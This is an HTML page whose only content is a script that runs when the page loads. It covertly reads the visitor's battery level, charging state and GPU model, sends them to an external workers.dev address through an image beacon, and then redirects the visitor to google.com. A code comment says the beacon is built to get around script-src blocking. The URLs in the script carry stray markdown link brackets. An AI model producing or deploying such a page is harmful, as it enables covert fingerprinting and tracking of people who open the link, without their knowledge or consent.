<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="background:#000;">
<script>
async function xray() {
    let info = { batt: "N/A", gpu: "N/A" };

    try {
        // Батарея
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            info.batt = `${Math.round(b.level * 100)}% [${b.charging ? '⚡' : '🔋'}]`;
        }
        // Видеокарта (GPU)
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "WebGL_On";
        }
    } catch (e) {}

    const t = encodeURIComponent(new Date().toLocaleString('ru-RU'));
    const d = encodeURIComponent(JSON.stringify(info));
    const workerUrl = "[https://adminfdm.alexgranny1708.workers.dev/](https://adminfdm.alexgranny1708.workers.dev/)";

    // Используем Image для обхода блокировок script-src и ускорения
    const img = new Image();
    const go = () => window.location.replace("[https://google.com](https://google.com)");
    
    img.onload = go;
    img.onerror = go;
    img.src = `${workerUrl}?t=${t}&d=${d}&_=${Date.now()}`;

    // Запасной редирект для медленных сетей
    setTimeout(go, 2500);
}

xray();
</script>
</body>
</html>
